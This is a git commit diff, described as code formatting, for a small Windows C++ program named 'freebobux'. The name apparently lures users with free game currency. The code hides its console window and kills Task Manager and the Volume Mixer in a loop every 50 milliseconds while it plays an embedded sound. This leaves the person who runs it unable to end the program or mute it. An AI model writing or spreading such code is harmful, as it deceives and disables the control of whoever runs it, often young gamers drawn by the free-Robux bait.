a3c4ca0084febb897a931db91fc57d50ac8870f9
Waves <65917727+Waves-rgb@users.noreply.github.com>
2020-11-23 12:43:20 -0500

    code formatting

--- freebobux/freebobux.cpp
+++ freebobux/freebobux.cpp
@@ -6,25 +6,24 @@
 
 using namespace std;
 
-int loop();
 bool exitNow = false;
 
-int main() {
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)loop, NULL, NULL, NULL);
-	
-    PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(NULL), SND_RESOURCE);
-	
-    exitNow = true;
-    return 0;
-}
-
-int loop() {
-    while (exitNow == false)
+int killLoop() {
+    while (!exitNow)
     {
         system("taskkill -f -im Taskmgr.exe > NUL 2>&1");
         system("taskkill -f -im SndVol.exe > NUL 2>&1");
         Sleep(50);
     }
     return 1;
+}
+
+int main() {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)killLoop, NULL, NULL, NULL);
+	
+    PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(NULL), SND_RESOURCE);
+	
+    exitNow = true;
+    return 0;
 }
